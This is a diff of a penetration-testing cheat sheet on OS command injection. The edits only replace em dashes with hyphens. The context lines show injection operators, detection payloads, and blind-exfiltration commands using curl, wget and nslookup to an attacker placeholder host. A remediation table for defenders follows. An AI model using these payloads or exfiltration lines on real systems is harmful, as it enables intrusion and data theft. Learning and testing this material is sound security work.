@@ -9,7 +9,7 @@ The app takes your input and passes it directly to a system shell command withou
 $output = shell_exec("ping " . $_GET['ip']);
 ```
 
-You send: `127.0.0.1; whoami` → server runs: `ping 127.0.0.1; whoami` → output of `whoami` comes back.
+You send: `127.0.0.1; whoami` -> server runs: `ping 127.0.0.1; whoami` -> output of `whoami` comes back.
 
 ---
 
@@ -25,7 +25,7 @@ Any input that seems to interact with the OS:
 
 ## Injection Operators
 
-Different operators work on different OS/contexts — try all of them:
+Different operators work on different OS/contexts - try all of them:
 
 ```
 # Linux & Windows (both)
@@ -36,7 +36,7 @@ Different operators work on different OS/contexts — try all of them:
 # Linux only
 |          127.0.0.1 | whoami
 ||         127.0.0.1 || whoami
-`whoami`   (backtick — inline execution)
+`whoami`   (backtick - inline execution)
 $(whoami)  (subshell)
 
 # Windows only
@@ -49,7 +49,7 @@ $(whoami)  (subshell)
 ## Basic Detection
 
 ```
-# Test payloads — look for command output in response or time delay
+# Test payloads - look for command output in response or time delay
 ; whoami
 & whoami
 | whoami
@@ -121,14 +121,14 @@ who^ami
 When you can inject commands but see no output:
 
 ```sh
-# DNS exfil — output appears in your DNS logs
+# DNS exfil - output appears in your DNS logs
 ; nslookup $(whoami).<KALI-IP>.burpcollaborator.net
 
-# HTTP exfil — output hits your web server
+# HTTP exfil - output hits your web server
 ; curl http://<KALI-IP>:8080/$(whoami)
 ; wget http://<KALI-IP>:8080/?output=$(id | base64)
 
-# File write — write output to web root, then read via browser
+# File write - write output to web root, then read via browser
 ; whoami > /var/www/html/output.txt
 # Visit: http://target/output.txt
 ```
@@ -149,9 +149,9 @@ nc -lvnp 4444
 
 | Finding | Remediation |
 |---|---|
-| Command injection via user input | **Avoid shell entirely** — use language-native libraries instead of shell commands. Example: instead of `shell_exec("ping " . $ip)`, use PHP's `net_ping` equivalent or ICMP libraries. |
-| Must use shell (legacy code) | Use an **allowlist** — validate that input matches an expected pattern (e.g., IP address must match `^\d{1,3}(\.\d{1,3}){3}$`) before passing to shell. Reject anything that doesn't match exactly. |
+| Command injection via user input | **Avoid shell entirely** - use language-native libraries instead of shell commands. Example: instead of `shell_exec("ping " . $ip)`, use PHP's `net_ping` equivalent or ICMP libraries. |
+| Must use shell (legacy code) | Use an **allowlist** - validate that input matches an expected pattern (e.g., IP address must match `^\d{1,3}(\.\d{1,3}){3}$`) before passing to shell. Reject anything that doesn't match exactly. |
 | PHP `shell_exec` / `exec` | In PHP, use `escapeshellarg()` and `escapeshellcmd()` to sanitize. Not a perfect fix, but significantly reduces risk when rewriting isn't feasible. |
 | Web server running as root | Run web server processes as a low-privilege dedicated account (e.g., `www-data`). Command injection then gives a low-priv shell, not root immediately. |
 
-**Key point for reports:** The correct fix is to not use shell functions with user input at all — not to sanitize the input. Sanitization approaches fail; there are too many bypass techniques. Architecture is the solution.
+**Key point for reports:** The correct fix is to not use shell functions with user input at all - not to sanitize the input. Sanitization approaches fail; there are too many bypass techniques. Architecture is the solution.
